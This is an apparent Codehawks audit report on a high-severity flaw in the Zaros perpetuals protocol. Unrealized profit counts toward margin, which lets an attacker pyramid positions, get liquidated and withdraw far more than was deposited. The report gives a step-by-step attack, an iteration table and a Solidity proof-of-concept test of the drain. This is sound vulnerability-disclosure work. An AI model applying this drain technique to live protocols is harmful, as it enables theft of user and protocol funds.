---
tags:
  - lang/solidity
  - sector/lending
  - sector/perpetuals
  - platform/codehawks
  - has/github
  - has/poc
  - severity/high
  - impact/loss-of-funds/direct-drain
protocol: "[[Zaros]]"
auditors:
  - "[[fyamf]]"
genome:
  - "[[liquidation-logic]]"
  - "[[direct-drain]]"
  - "[[liquidation-underwater]]"
---
# Draining the protocol fully

- id: 38003
- impact: HIGH
- protocol: [[Zaros]]
- reporter: fyamf (Codehawks)
- source: N/A

## Summary


The bug report describes a vulnerability in a protocol where an attacker can exploit the system and drain a large amount of funds. The attacker deposits a large collateral and creates a series of orders that will increase the mark price and add unrealized profit to the collateral balance. This allows the attacker to create more orders and repeat the process until reaching the maximum allowed open interest. After the account is liquidated, the attacker can easily withdraw the remaining funds. The report includes a proof of concept that demonstrates how the attack can be carried out. The impact of this vulnerability is significant as it can result in a large amount of funds being stolen from the protocol. The report recommends investigating the issue and implementing measures to prevent similar attacks in the future.

## Details

## Summary

* Attacker deposits a large collateral, and creates an order with large size delta. Later, it fills.
* Then, the attacker creates second order, and later it fills.
* The second order will increase the mark price, so the old position will gain large unrealized profit. This profit will be added to the collateral balance, and makes the margin balance larger.
* Now that the margin balance is larger (thanks to the unrealized profit), it allows creating another order again.
* The attacker repeats this, until reaching to the maximum allowed open interest.
* Now the attacker has a huge collateral balance and position size.
* Now the attacker's account is liquidatable.
* After it is liquidated, huge amount of fund will be remained as collateral in the attacker's account.
* Attacker can now easily withdraw them.
  <https://github.com/Cyfrin/2024-07-zaros/blob/main/src/perpetuals/branches/SettlementBranch.sol#L435>
  <https://github.com/Cyfrin/2024-07-zaros/blob/main/src/perpetuals/leaves/TradingAccount.sol#L200>

## Vulnerability Details

The following scenario is implemented in the PoC. It can be verified easily by running the PoC.

* Attacker deposits 1\_000\_000 USDz as collateral in ETH market where its index price is 1000\$.
* Attack creates a long position order with size 92\_000.
* This order will be filled at mark price 1004.6\$.
* The attacker creates another long position order with size 60\_000. It is expected that it reverts because very simply the final position size would be 152\_000 each with minimum price of 1000\$. So, the final position value would be `152_000 * 1000 = 152M`, and its required inital margin would be `0.01 * 152M = 1.52M`, while the collateral worths only 1M, which is less than the initial required margin.
* But the protocol is implemented differently, and this order will be filled successfully. Because, when the new order 60\_000 is created, the mark price will increase to 1012.2  (this is because the skew increases). Then, the unrealized profit associated to the old position will be added to the collateral which is equal to `92_000 * (1012.2 - 1004.6) = 699_200$`, so the collateral would be equal to `1_000_000 + 699_200 = 1.699M` by ignoring the fees for simplicity (the PoC demonstrates the real case). It can be seen that since collateral is higher than initial required margin `1.52M`, it allows the order to be created and later filled.
* Now, the attacker has a long position with size 152\_000, while the original collateral was 1M.
* The attacker repeats this scenario again. I.e. he again creates another long position order with size 60\_000, and it later be filled. He repeats this until it reaches to the `maxOpenInterest` (maximum profit of the attacker is when reaching to this limit, that is why some iterations are done. Without any iteration, the attacker would steal less fund). The PoC shows that 15 iterations are enough to reach to this limit. The following table shows each step in real case (including fees).

```Solidity
                        sizeDelta       markPrice       newSkew     marginCollateralBalance  
befor order creation    0               1000            0           1_000_000                    
first order             92k             1004.6          92k         926_059
iteration 1             60k             1012.2          152k        1_576_671    
iteration 2             60k             1018.2          212k        2_439_796         
iteration 3             60k             1024.2          272k        3_662_632 
iteration 4             60k             1030.2          332k        5_245_180
iteration 5             60k             1036.2          392k        7_187_441
iteration 6             60k             1042.2          452k        9_489_413
iteration 7             60k             1048.2          512k        12_151_097
iteration 8             60k             1054.2          572k        15_172_494
iteration 9             60k             1060.2          632k        18_553_602
iteration 10            60k             1066.2          692k        22_294_422 
iteration 11            60k             1072.2          752k        26_394_954
iteration 12            60k             1078.2          812k        30_855_198
iteration 13            60k             1084.2          872k        35_675_153
iteration 14            60k             1090.2          932k        40_854_821
iteration 15            60k             1096.2          992k        46_394_200                                                                              
```

* The table shows that after the final order being filled, the  `marginCollateralBalance` is equal to `46_394_200`. For sure this account is liquidatable because the `requiredMaintenanceMarginUsdX18` is equal to `992k * 1049.6 * 0.005 = 5_206_016` (where 1049.6 is the mark price when closing the entire position). While the `marginBalanceUsdX18` is just equal to `46_394_200 - (1096.2 - 1049.6) * 992k = 167_000`.
* When this account is liquidated, the `requiredMaintenanceMarginUsdX18` will be deducted from `marginCollateralBalance`, so the remaining would be `46_394_200 - 5_206_016 - liquidation fee = 41_188_179`. Moreover, the position would be entirely closed.
* Now, the attack can withdraw the remaining `marginCollateralBalance` which is equal to `41_188_179`. So, the attacker just paid 1M, but he could steal almost 41M, equal to 40M profit.
* Note that after the second iteration, the account is liquidatable. If after the second iteration, it is liquidated, the attacker would steal `1_368_555$`, equal to `368_555$` profit.

### PoC

The following test shows what explained above.

```solidity
    function test_drainingTheProtocol()
       external
       givenTheSenderIsTheKeeper
       givenTheMarketOrderExists
       givenThePerpMarketIsEnabled
       givenTheSettlementStrategyIsEnabled
       givenTheReportVerificationPasses
       whenTheMarketOrderIdMatches
       givenTheDataStreamsReportIsValid
       givenTheAccountWillMeetTheMarginRequirement
       givenTheMarketsOILimitWontBeExceeded
   {
       TestFuzz_GivenThePnlIsPositive_Context memory ctx;
       ctx.fuzzMarketConfig = getFuzzMarketConfig(ETH_USD_MARKET_ID);

       uint256 marginValueUsd = 1_000_000e18;

       ctx.marketOrderKeeper = marketOrderKeepers[ctx.fuzzMarketConfig.marketId];

       deal({ token: address(usdz), to: users.naruto.account, give: marginValueUsd });

       // attacker creates an account and deposits 1M as collateral
       ctx.tradingAccountId = createAccountAndDeposit(marginValueUsd, address(usdz));

       UD60x18 collat = perpsEngine.getAccountMarginCollateralBalance(ctx.tradingAccountId, address(usdz));
       console.log("collateral value before the attack: ", unwrap(collat)); // 1M
       console.log("attakcer's balance before the attack: ", IERC20(address(usdz)).balanceOf(users.naruto.account)); // 0$

       console.log("\nCreating first order\n");

       // Creating the first order
       perpsEngine.createMarketOrder(
           OrderBranch.CreateMarketOrderParams({
               tradingAccountId: ctx.tradingAccountId,
               marketId: ctx.fuzzMarketConfig.marketId,
               sizeDelta: int128(92_000e18) // sizeDelta is 92k
            })
       );

       console.log("\nFilling first order\n");

       // Filling the first order
       ctx.firstMockSignedReport =
           getMockedSignedReport(ctx.fuzzMarketConfig.streamId, ctx.fuzzMarketConfig.mockUsdPrice);
       changePrank({ msgSender: ctx.marketOrderKeeper });
       perpsEngine.fillMarketOrder(ctx.tradingAccountId, ctx.fuzzMarketConfig.marketId, ctx.firstMockSignedReport);

       collat = perpsEngine.getAccountMarginCollateralBalance(ctx.tradingAccountId, address(usdz));
       console.log("collateral after first order: ", unwrap(collat));

       for (uint256 i = 1; i < 16; ++i) {
           // assuming that there is a delay of 20 seconds between each order
           // this is just to make the scenario realistic and includes the funding fee in calculation either
           skip(20);

           console.log("\niteration: ", i);
           console.log("");

           // creating order
           changePrank({ msgSender: users.naruto.account });
           perpsEngine.createMarketOrder(
               OrderBranch.CreateMarketOrderParams({
                   tradingAccountId: ctx.tradingAccountId,
                   marketId: ctx.fuzzMarketConfig.marketId,
                   sizeDelta: 60_000e18 // sizeDelat 60k
               })
           );

           // filling the order
           changePrank({ msgSender: ctx.marketOrderKeeper });
           ctx.firstMockSignedReport =
               getMockedSignedReport(ctx.fuzzMarketConfig.streamId, ctx.fuzzMarketConfig.mockUsdPrice);
           perpsEngine.fillMarketOrder(
               ctx.tradingAccountId, ctx.fuzzMarketConfig.marketId, ctx.firstMockSignedReport
           );

           collat = perpsEngine.getAccountMarginCollateralBalance(ctx.tradingAccountId, address(usdz));
           console.log("collateral after each iteration: ", unwrap(collat));
       }

       uint128[] memory liquidatableAccountsIds = perpsEngine.checkLiquidatableAccounts(0, 1);
       ctx.tradingAccountId = 1;
       console.log("account id: ", ctx.tradingAccountId);
       console.log("liquidatableAccountsIds: ", liquidatableAccountsIds[0]); // this shows the account ids that are liquidatable

       // liquidating the account
       changePrank({ msgSender: liquidationKeeper });
       uint128[] memory accountsIds = new uint128[](1);
       accountsIds[0] = ctx.tradingAccountId;
       perpsEngine.liquidateAccounts(accountsIds);

       collat = perpsEngine.getAccountMarginCollateralBalance(ctx.tradingAccountId, address(usdz));
       console.log("collateral after liquidation: ", unwrap(collat)); // this shows the remaing collateral after the liquidation

       changePrank({ msgSender: users.naruto.account });
       perpsEngine.withdrawMargin(ctx.tradingAccountId, address(usdz), unwrap(collat)); // attacker withdraws its collateral

       // the stolen amounts are transferred to the attacker's balance
       console.log("attacker's final balance: ", IERC20(address(usdz)).balanceOf(users.naruto.account));
   }
```

## Impact

* Draining the protocol.

## Tools Used

## Recommendations

This scenario should be investigated from different point of views:

* Unrealized profit is added to the collateral balance. This collateral balance plays the role for validating the margin requirements. One possible solution is to separate the unrealized profit from the collateral when validating the margin requirements.
* The protocol should not allow a user to increase a position when it is liquidatable (it should be stopped at least in iteration 2). There is some checks for such cases, but it is bypassed because the unrealized profit is added to the collateral and increased the margin balance.
